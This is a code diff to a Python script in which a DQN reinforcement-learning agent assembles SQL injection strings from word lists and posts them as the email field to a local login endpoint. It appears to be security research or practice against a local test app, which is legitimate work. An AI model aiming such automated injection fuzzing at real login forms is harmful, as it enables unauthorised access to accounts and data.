@@ -1,4 +1,5 @@
 import os
+from typing import List
 
 from dqn import DQN
 from models.epsilon_model import EpsilonModel
@@ -7,8 +8,7 @@ import numpy as np
 import requests
 import re
 
-url = 'http://localhost:3000'
-injection_path = '/#/login'
+url = 'http://localhost.proxyman.io:3000/rest/user/login'
 
 # Scrape site solution by T0ny lombardi from:
 # https://stackoverflow.com/questions/9265172/scrape-an-entire-website
@@ -22,38 +22,52 @@ with open('parsed-scrape.txt', 'r') as f:
     data = f.read()
 f.close()
 
-found_words = [data.split(' ')]
+found_words = list(filter(lambda s: s != '', data.split(' ')))
 
 with open('sql_list.txt', 'r') as f:
     data = f.read()
 f.close()
 
-sql_list = [data.split('\n')]
+sql_list = data.split('\n')
 
-actions: list[str] = termination + visible_chars + sql_list + found_words
+actions: List[str] = termination + visible_chars + sql_list + found_words
 
 terminated = False
 state: np.ndarray
 
 def __get_payload():
     chrs = state.tolist()
-    chrs = [chr(i) for i in chrs if i != 0.0]
+    chrs = [chr(int(i)) for i in chrs if i != 0.0]
     return ''.join(chrs)
 
 def __perform_action(action_index: int):
+    global state
+
     action = actions[action_index]
 
     if(action != 'TERMINATE'):
         for i in range(len(state)):
-            if(state[i] == 0.0):
-                state[i] = action
-                return state, 0, False
+            if(state[i] != 0.0):
+                continue
+
+            for j in range(len(action)):
+                state_index = i + j
+                if(state_index >= len(state)):
+                    break
+                
+                if(len(action[j]) != 1):
+                    print(action)
+
+                state[state_index] = ord(action[j])
+            return state, 0, False
             
         return state, -1, False
 
     payload = __get_payload()
     print(payload)
-    res = requests.get(url + injection_path + payload)
+    res = requests.post(url, data={
+        'email': payload
+    })
 
     unique_tokens = set()
     for token in re.split('[^a-zA-Z]+', res.text):
@@ -68,7 +82,8 @@ def __perform_action(action_index: int):
 
     dqn.add_to_available_actions_count(reward)
 
-    return dqn.create_empty_state(), reward, True
+    state = dqn.create_empty_state()
+    return state, reward, True
 
 dqn = DQN(
     RLHyperparametersModel(
@@ -90,3 +105,7 @@ dqn = DQN(
     perform_action_callback=__perform_action
 )
 
+state = dqn.create_empty_state()
+
+model, model_target = dqn.create_model()
+dqn.run(model, model_target)
